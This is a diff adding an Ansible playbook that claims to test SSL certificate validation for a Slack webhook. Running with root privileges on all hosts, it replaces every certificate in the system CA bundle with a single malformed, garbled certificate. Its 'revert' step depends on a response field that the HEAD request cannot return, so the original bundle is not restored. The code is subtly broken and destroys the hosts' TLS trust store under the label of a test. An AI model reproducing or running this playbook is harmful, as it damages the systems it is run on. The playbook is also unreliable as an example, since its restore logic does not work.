@@ -1,0 +1,40 @@
+
+---
+- name: Test SSL Cert Validation for Slack Webhook
+  hosts: all
+  become: true
+
+  vars:
+    slack_webhook_url: "https://hooks.slack.com/services/T1234567/B1234567/XXXXXXXXXXXXXXXXXXXXXXXX"
+    slack_channel: "#general"
+    slack_message: "Hello from Ansible!"
+
+  tasks:
+  - name: Verify SSL Certificate for Slack Webhook
+    uri:
+      url: "{{ slack_webhook_url }}"
+      method: HEAD
+      validate_certs: yes
+    register: webhook_response
+
+  - name: Test SSL Certificate Validation
+    replace:
+      path: "/etc/ssl/certs/ca-certificates.crt" # or the path where the SSL cert file is located
+      backup: yes
+      regexp: "-----BEGIN CERTIFICATE-----[\\w\\W]+?-----END CERTIFICATE-----"
+      replace: |
+        -----BEGIN CERTIFICATE-----
+        MIIDETCCAfmgAwIBAgIRAM3Mezg8Q======aVhbm5vLmNvbS5ici9leUZURm5Q#
+        -----END CERTIFICATE-----
+
+  - name: Post message to Slack
+    slack:
+      msg: "{{ slack_message }}"
+      webhook_url: "{{ slack_webhook_url }}"
+      channel: "{{ slack_channel }}"
+
+  - name: Revert SSL Certificate
+    replace:
+      path: "/etc/ssl/certs/ca-certificates.crt" # or the path where the SSL cert file is located
+      regexp: "-----BEGIN CERTIFICATE-----[\\w\\W]+?-----END CERTIFICATE-----"
+      replace: "{{ webhook_response.json.change_after }}"
